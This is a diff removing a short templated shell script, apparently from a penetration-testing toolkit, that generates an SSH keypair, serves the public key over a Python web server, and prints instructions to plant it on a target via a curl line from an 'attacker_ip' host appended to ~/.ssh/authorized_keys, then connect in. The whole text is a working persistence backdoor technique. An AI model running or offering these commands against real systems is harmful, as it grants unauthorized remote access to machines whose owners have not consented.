@@ -1,8 +1,0 @@
-mkdir -p packstation/outbound; ssh-keygen -t rsa -b 4096 -f ~/.ssh/id69_rsa -N ""; cp -n ~/.ssh/id69_rsa.pub packstation/outbound/; \
-echo '================================================================'; \
-echo '                       -----Linux------                         '; \
-echo 'Deliver (without credentials): mkdir -p ~/.ssh && curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/id69_rsa.pub >> ~/.ssh/authorized_keys'; \
-echo 'Deliver (with credentials): ssh-copy-id -i ~/.ssh/id69_rsa <user>@<remote_ip>'
-echo 'Connect to box: ssh -i ~/.ssh/id69_rsa <user>@<remote_ip>'
-echo '================================================================'; \
-python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
